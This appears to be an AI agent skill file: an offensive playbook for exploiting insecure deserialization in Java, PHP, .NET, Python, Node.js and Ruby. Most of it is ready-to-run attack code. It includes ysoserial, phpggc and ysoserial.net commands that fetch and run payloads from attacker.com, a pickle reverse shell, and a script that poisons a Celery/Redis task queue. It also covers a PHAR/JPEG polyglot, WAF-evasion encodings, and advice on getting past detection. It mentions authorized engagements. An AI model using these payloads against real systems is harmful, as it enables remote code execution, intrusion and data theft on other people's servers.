---
name: offensive-deserialization
description: "Insecure deserialization exploitation across Java, PHP, .NET, Python, Node.js, and Ruby. Covers gadget chain construction with ysoserial/phpggc/ysoserial.net, ObjectInputStream and BinaryFormatter sink identification, pickle __reduce__ RCE, phar:// wrapper abuse, Jackson polymorphic typing, Json.NET TypeNameHandling, ViewState tampering, node-serialize IIFE injection, Ruby Marshal.load and YAML.load gadgets, framework-specific chains for Spring/Hibernate/Laravel/Symfony, modern attack surfaces including Kubernetes admission webhooks and message queue consumers, WAF bypass through encoding layers and content-type manipulation, and serialVersionUID/JMX/RMI vectors. Activate when the engagement involves deserialization sinks, serialized data in cookies or request bodies, gadget chain development, magic method abuse, ysoserial payload generation, or any review of marshalling and unmarshalling logic in target applications."
---

# Offensive Deserialization

Deserialization vulnerabilities arise when an application reconstructs objects from
serialized byte streams without validating the type, integrity, or origin of the
data. Object reconstruction triggers constructors, finalizers, and language-specific
magic methods, so an attacker who controls the serialized input often achieves remote
code execution before any application-level validation runs.

## Quick Workflow
1. Enumerate every entry point accepting opaque binary or encoded data -- cookies,
   HTTP bodies, headers, message queue messages, file uploads, GraphQL custom scalars,
   gRPC fields, JMX/RMI endpoints.
2. Fingerprint the serialization format via magic bytes, content-type headers, and
   error behavior (see Recognition Signatures).
3. Determine the server-side language and framework version from error pages, HTTP
   headers, or source code.
4. Select candidate gadget chains matching the target classpath or installed packages.
   Generate payloads with ysoserial, phpggc, ysoserial.net, or manual construction.
5. Deliver through the identified entry point. Start with DNS-only or sleep-based
   proof to confirm execution without destructive side effects.
6. Escalate from proof-of-concept to the engagement objective with authorization.
7. Document the full chain: entry point, format, gadget chain, library versions, proof.

---
## Recognition Signatures

| Format | Signature | Notes |
|---|---|---|
| Java ObjectInputStream | Hex `ac ed 00 05`, Base64 `rO0AB` | Cookies, POST bodies, JMX/RMI streams |
| PHP serialize | `O:<len>:"ClassName":` or `a:<count>:{` | Frequently Base64-wrapped in cookies |
| .NET BinaryFormatter | Base64 `AAEAAAD/////` | ViewState, remoting, session state |
| Python pickle | Opcodes `\x80\x04\x95` (v4+), older `(dp0` text | Redis caches, Celery tasks, ML pipelines |
| Ruby Marshal | `\x04\x08` leading bytes | Session cookies in older Rails apps |
| YAML (any lang) | `--- !ruby/object:` or `!!python/object/apply:` | Tag-based instantiation |
| Java XMLDecoder | `<?xml` with `<java>` or `<object class=` | Legacy Java admin panels |
| .NET Json.NET | `"$type":` key in JSON | TypeNameHandling != None |
| Java Jackson | `["class.name", {` JSON array wrapper | enableDefaultTyping / polymorphic handling |

---
## Java Deserialization

`ObjectInputStream.readObject()` instantiates arbitrary classes present on the
classpath. Decades of library code provide usable gadget chains.

### Identifying Sinks

```java
// Direct ObjectInputStream usage
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();

// XMLDecoder -- equally dangerous, often overlooked
XMLDecoder decoder = new XMLDecoder(inputStream);
Object obj = decoder.readObject();

// XStream without allowlist
XStream xstream = new XStream();
Object obj = xstream.fromXML(userInput);

// Jackson polymorphic typing -- CVE-2017-7525 and successors
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();

// Jackson @JsonTypeInfo on base class
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
public abstract class BaseCommand { }

// JMX/RMI endpoints -- default port 1099, often unauthenticated
```

### serialVersionUID and Classpath Constraints

Every serializable Java class carries a `serialVersionUID`. A mismatch causes
`InvalidClassException` before any gadget logic executes. Extract the server's UID
from error messages or decompiled JARs, then rebuild the payload with ysoserial's
source. The UID often changes only on major releases, so brute-forcing common
versions is feasible when the exact version is unknown.

### ysoserial Gadget Chains

Match the chain to libraries present on the target classpath.

```bash
# CommonsCollections -- most widely applicable
# CC1: commons-collections 3.1, JDK < 8u72
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/cb' > payload.bin
# CC5: later JDK versions where CC1 is patched
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/cb' > payload.bin
# CC7: Hashtable entry point, bypasses some ObjectInputFilter rules
java -jar ysoserial.jar CommonsCollections7 'id > /tmp/proof.txt' > payload.bin

# Spring chain -- requires spring-core + spring-beans
java -jar ysoserial.jar Spring1 'wget http://attacker.com/s.sh -O /tmp/s.sh' > payload.bin
# Hibernate chain -- requires hibernate-core
java -jar ysoserial.jar Hibernate1 'bash -c {echo,BASE64}|{base64,-d}|bash' > payload.bin
# CommonsBeanutils -- present in many apps via shaded dependencies
java -jar ysoserial.jar CommonsBeanutils1 'ping -c 3 attacker.com' > payload.bin

# URLDNS -- DNS lookup only, no RCE, safe for detection confirmation
java -jar ysoserial.jar URLDNS 'http://deser-confirm.attacker.com' > payload.bin

# JRMPClient -- redirect deser to attacker-controlled JRMP listener
java -jar ysoserial.jar JRMPClient 'attacker.com:1099' > payload.bin
# On attacker host, serve secondary payload via JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
```

### JMX/RMI Deserialization

JMX and RMI registries accept serialized objects over the wire and are frequently
exposed without authentication on internal networks.

```bash
# Scan for RMI registries
nmap -sV -p 1099,1098,9010,9011 --script rmi-dumpregistry TARGET

# marshalsec: exploit RMI/JNDI
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
  "http://attacker.com:8080/#ExploitClass" 1099
```

### Jackson Polymorphic Typing

When `enableDefaultTyping()` or `@JsonTypeInfo(use = Id.CLASS)` is active, you
supply a JSON array naming the class to instantiate.

```json
["com.sun.rowset.JdbcRowSetImpl",
 {"dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}]
```

Jackson maintainers continuously add classes to a denylist. Check the target's
version against known bypass classes: `org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`,
`com.caucho.config.types.ResourceRef`, and similar JNDI-capable beans.

---
## PHP Deserialization

`unserialize()` instantiates objects and invokes magic methods (`__wakeup`,
`__destruct`, `__toString`) during reconstruction. The `phar://` stream wrapper
triggers deserialization without an explicit `unserialize()` call.

### Identifying Sinks

```php
// Direct unserialize
$obj = unserialize($userInput);

// phar:// wrapper -- any file operation on a phar:// path is a sink
file_exists("phar://uploads/avatar.jpg");
is_dir("phar://" . $userControlledPath);
// Triggering functions: file_exists, is_dir, is_file, file_get_contents,
// fopen, fileatime, filectime, filemtime, filesize, copy, rename, unlink,
// stat, lstat, getimagesize, exif_read_data, hash_file, md5_file, sha1_file
```

### phpggc Gadget Chains

```bash
phpggc -l  # List all available chains

# Laravel RCE -- PendingBroadcast + Dispatcher, works 5.5 through 9.x
phpggc Laravel/RCE1 system 'id' -b        # -b = base64
phpggc Laravel/RCE10 system 'cat /etc/passwd' -s  # -s = serialized

# Symfony RCE -- targets process component
phpggc Symfony/RCE4 exec 'curl http://attacker.com/s.sh|bash' -b
# Monolog RCE -- present in most Composer projects
phpggc Monolog/RCE1 system 'whoami' -b
# Guzzle / WordPress chains
phpggc Guzzle/RCE1 system 'id' -b
phpggc WordPress/RCE1 system 'id' -b

# PHAR output instead of raw serialized data
phpggc Laravel/RCE1 system 'id' -p phar -o exploit.phar
# PHAR polyglot disguised as JPEG
phpggc Laravel/RCE1 system 'id' -p phar -pp header.jpg -o exploit.jpg
```

### phar:// Exploitation

The phar:// wrapper deserializes the metadata section of a PHAR archive on any file
operation. The sink is a file function, not `unserialize()`, so it evades many audits.

```php
// Build a malicious PHAR (php.ini: phar.readonly = 0)
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$object = new VulnerableClass();
$object->command = 'id';
$phar->setMetadata($object);
$phar->stopBuffering();

// Create a polyglot by prepending a JPEG header
$jpegHeader = file_get_contents('legitimate.jpg');
file_put_contents('exploit.jpg', $jpegHeader . file_get_contents('exploit.phar'));
```

Upload the polyglot as an image, then trigger a file operation referencing
`phar://uploads/exploit.jpg/test.txt`.

---
## .NET Deserialization

`BinaryFormatter` is the most dangerous .NET serializer. Microsoft has formally
deprecated it, but legacy applications and internal tools still use it.

### Identifying Sinks

```csharp
// BinaryFormatter -- deprecated, always dangerous
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);

// SoapFormatter / NetDataContractSerializer -- equally dangerous, less common

// LosFormatter -- used in ViewState
LosFormatter los = new LosFormatter();
object obj = los.Deserialize(viewStateString);

// Json.NET with TypeNameHandling != None
JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // or Objects, Arrays, Auto
});
```

### ysoserial.net Payloads

```powershell
# TypeConfuseDelegate -- broad .NET coverage
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.com"
# WindowsIdentity -- when TypeConfuseDelegate is blocked
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "certutil -urlcache -split -f http://attacker.com/s.exe C:\Temp\s.exe"
# TextFormattingRunProperties -- targets WPF/XAML
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc.exe"
# PSObject -- PowerShell-specific
ysoserial.exe -g PSObject -f BinaryFormatter -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
# Json.NET TypeNameHandling
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami > C:\proof.txt"
# Base64 output for ViewState or cookie injection
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping attacker.com" -o base64
```

### ViewState Exploitation

ASP.NET ViewState is a serialized hidden form field. When MAC validation is disabled
or the machine key is known, you inject a gadget chain directly.

```bash
# If machine key is known (web.config disclosure, default keys):
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -enc BASE64CMD" \
  --validationalg="SHA1" \
  --validationkey="KNOWN_KEY" \
  --generator="GENERATOR_VALUE" \
  --path="/target/page.aspx" \
  --islegacy
```

### Json.NET TypeNameHandling

When `TypeNameHandling` is not `None`, the `$type` property controls instantiation.

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {"$type": "System.Diagnostics.Process, System"}
}
```

---
## Python Deserialization

Python's `pickle` executes arbitrary code during deserialization through the
`__reduce__` method. There is no safe way to deserialize untrusted pickle data.

### pickle RCE

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/callback',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# Reverse shell variant
class ReverseShell:
    def __reduce__(self):
        return (os.system, (
            'python3 -c \'import socket,subprocess,os;'
            's=socket.socket();s.connect(("attacker.com",4444));'
            'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
            'os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',))

# Chained multi-step payload
class ChainedExploit:
    def __reduce__(self):
        return (eval, ("__import__('os').system('wget http://attacker.com/i -O /tmp/i && chmod +x /tmp/i && /tmp/i')",))
```

### yaml.load RCE

`yaml.load()` without a safe loader permits arbitrary object instantiation.

```yaml
# Direct command execution
!!python/object/apply:os.system
- "curl http://attacker.com/callback"

# Subprocess with output
!!python/object/apply:subprocess.check_output
- ["id"]
```

```bash
# Find unsafe yaml.load in codebase
grep -rn "yaml\.load\s*(" --include="*.py" /path/to/codebase
```

### Other Python Vectors

```python
import shelve   # Uses pickle internally -- RCE on shelve.open() of attacker-controlled .db
import marshal  # Code object injection via marshal.loads()
import jsonpickle  # Third-party, same risks as pickle via jsonpickle.decode()
```

---
## Node.js Deserialization

### node-serialize IIFE Pattern

The `node-serialize` library uses `_$$ND_FUNC$$_` to mark serialized functions.
Appending `()` creates an IIFE that executes during deserialization.

```javascript
// Trailing () causes immediate execution
{"role":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl http://attacker.com/cb')}()"}

// Base64-wrapped to avoid character issues
{"p":"_$$ND_FUNC$$_function(){eval(Buffer.from('BASE64PAYLOAD','base64').toString())}()"}
```

### funcster

```javascript
// funcster deserializes via new Function() constructor
{"__js_function": "function(){return require('child_process').execSync('id').toString()}"}
```

Look for `_$$ND_FUNC$$_` and `__js_function` in cookies, session tokens, and request
bodies.

---
## Ruby Deserialization

`Marshal.load` and `YAML.load` both instantiate arbitrary objects and are common
sinks in Rails applications.

### Marshal.load Gadgets

```ruby
# Gem::Requirement chain (Ruby 2.x) / Gem::Installer (varies by version)
# ERB template execution chain
require 'erb'
class Exploit
  def initialize
    @template = "<%= `id` %>"
  end
end
payload = Marshal.dump(exploit_chain)
encoded = Base64.strict_encode64(payload)
```

### YAML.load Gadgets

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: "curl http://attacker.com/callback"
       method_id: :resolve
```

Rails session cookies before 5.2 used signed but not encrypted Marshal data. With
the `secret_key_base`, you forge session cookies containing gadget chains.

---
## Modern Attack Vectors

### Kubernetes Admission Webhooks

Admission controllers deserialize `AdmissionReview` JSON. A webhook that passes
annotation or label values from the admission request to an unsafe deserializer
creates a cluster-level RCE vector.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
  annotations:
    config-data: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH..."
spec:
  containers:
  - name: test
    image: nginx
```

The payload executes in the webhook's context, which typically has elevated cluster
permissions.

### Message Queue Consumers

Applications consuming from Kafka, RabbitMQ, SQS, or Redis often blindly
deserialize message payloads. Producer access lets you poison every consumer.

```python
import redis, pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/callback',))

r = redis.Redis(host='target-redis', port=6379)
r.lpush('celery', pickle.dumps({
    'body': pickle.dumps(Exploit()),
    'content-type': 'application/x-python-serialize',
}))
```

### Serverless Triggers

Serverless functions deserializing event payloads from S3, SNS, or SQS are
vulnerable when the event source is attacker-controllable (e.g., public upload).

```python
def handler(event, context):
    obj = s3.get_object(Bucket=event['Records'][0]['s3']['bucket']['name'],
                        Key=event['Records'][0]['s3']['object']['key'])
    data = pickle.loads(obj['Body'].read())  # RCE if attacker uploads to bucket
```

---
## Evasion Techniques

### WAF and Filter Bypass

```bash
# Double Base64 -- changes byte pattern
cat payload.bin | base64 | base64 > double_encoded.txt

# Gzip before Base64 -- entirely different pattern
gzip -c payload.bin | base64 > compressed_payload.txt

# URL encoding
cat payload.bin | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.buffer.read()))"

# Unicode escaping for JSON payloads -- replace ASCII in $type with \uXXXX
# Parameter splitting -- some apps concatenate params before deserializing
```

### Content-Type Manipulation

Switch the delivery format to bypass format-specific WAF rules:

```http
POST /api/endpoint HTTP/1.1
Content-Type: application/x-java-serialized-object

[binary payload]
```

```xml
<?xml version="1.0"?>
<java class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <string>curl http://attacker.com/callback</string>
    </void>
  </object>
</java>
```

### Encoding Layers

Many applications apply multiple encoding layers. Wrap your payload to match:

1. Serialize the gadget chain.
2. Encrypt with a known or leaked key (session cookies, ViewState machine keys).
3. Apply HMAC if integrity checks exist (requires the signing key).
4. Base64 encode, then URL encode if delivered via query parameter.

When you lack the key, look for default keys in framework documentation, key
disclosure via path traversal or SSRF, or padding oracle attacks to encrypt without
the key.

---
## Detection / Defender View

Understanding defensive detection helps you craft payloads that avoid alerts.

**Network signatures defenders match:**
- Java magic bytes `ac ed 00 05` / Base64 `rO0AB` in HTTP traffic
- .NET `AAEAAAD/////` in form fields or cookies
- PHP `O:\d+:"` in request parameters
- `$type` keys in JSON bodies (Json.NET)
- `_$$ND_FUNC$$_` in Node.js cookies
- `!!python/object` tags in YAML inputs

**Runtime defenses you will encounter:**
- Java `ObjectInputFilter` (JEP 290) -- class allowlists/denylists. Bypass with
  chains operating entirely within the allowed set.
- .NET `SerializationBinder` -- restricts type resolution. Bypass with types within
  the allowed namespace that still enable execution.
- PHP `allowed_classes` in `unserialize()` -- limits instantiation. Bypass by using
  only allowed classes, or reaching the sink through phar:// where the parameter is
  not applied.
- WAF rules on serialized patterns -- bypass with encoding, compression, or
  content-type switching.
- RASP -- instruments deserialization calls. Test with URLDNS or sleep payloads
  first to gauge coverage.

**Log artifacts your attack generates:**
- `ClassNotFoundException` / `ClassCastException` in server logs (failed chain)
- Stack traces referencing `ObjectInputStream`, `readObject`, `readResolve`
- Unusual outbound DNS/HTTP from the application server
- Process spawning from the JVM/interpreter process

---
## Engagement Cheatsheet

| Scenario | Tool | Payload | Verification |
|---|---|---|---|
| Java, Commons Collections 3.x | ysoserial | `CommonsCollections1`-`7` | URLDNS first |
| Java, unknown classpath | ysoserial | `URLDNS` then error-based enumeration | DNS callback |
| PHP Laravel 5.x-9.x | phpggc | `Laravel/RCE1`-`RCE10` | DNS or sleep |
| PHP file upload + file op | phpggc | `-p phar -pp header.jpg` polyglot | phar:// trigger |
| .NET BinaryFormatter | ysoserial.net | `TypeConfuseDelegate` | Process or DNS |
| .NET ViewState, known key | ysoserial.net | `-p ViewState` with key params | Blind exec |
| .NET Json.NET TypeNameHandling | ysoserial.net | `ObjectDataProvider` `-f Json.Net` | File write or OOB |
| Python pickle in web app | Manual | `__reduce__` + `os.system` | Curl callback |
| Python Celery/Redis | Manual | Pickle into task queue | All consumers exec |
| Python yaml.load | Manual | `!!python/object/apply:os.system` | OOB callback |
| Node.js node-serialize | Manual | `_$$ND_FUNC$$_function(){...}()` | Reverse shell |
| Ruby Marshal in Rails cookie | Manual | Gem::Requirement + secret_key_base | Session forge + RCE |
| K8s admission webhook | ysoserial/manual | Payload in pod annotation | Webhook callback |

**Safe confirmation sequence (always start here):**
1. Send URLDNS (Java) or DNS-callback command to confirm deserialization occurs.
2. Send sleep/delay payload to confirm code execution without network egress.
3. Escalate to engagement-authorized objective.

---
## Key References

**Tools:**
- ysoserial (Java): https://github.com/frohoff/ysoserial
- phpggc (PHP): https://github.com/ambionics/phpggc
- ysoserial.net (.NET): https://github.com/pwntester/ysoserial.net
- marshalsec (Java JNDI/RMI): https://github.com/mbechler/marshalsec
- GadgetInspector: https://github.com/JackOfMostTrades/gadgetinspector
- Burp Deserialization Scanner (BApp Store)

**Critical CVEs:**
CVE-2015-4852 (WebLogic T3), CVE-2017-7525 (Jackson defaultTyping),
CVE-2017-9805 (Struts 2 XStream), CVE-2018-1000861 (Jenkins Stapler),
CVE-2019-2725 (WebLogic XMLDecoder), CVE-2019-6340 (Drupal REST),
CVE-2019-18935 (Telerik UI .NET), CVE-2020-9484 (Tomcat session persistence),
CVE-2020-36188 (Jackson SSRF via JNDI), CVE-2021-21978 (VMware View Planner),
CVE-2023-34362 (MOVEit Transfer), CVE-2023-46604 (ActiveMQ RCE)

**Research:**
"Marshalling Pickles" (Frohoff/Lawrence, AppSecCali 2015), "Friday the 13th: JSON
Attacks" (Munoz/Mirosh, BlackHat 2017), "Are You My Type?" (Munoz/Mirosh, .NET
serializers), OWASP Deserialization Cheat Sheet, PortSwigger Insecure Deserialization.
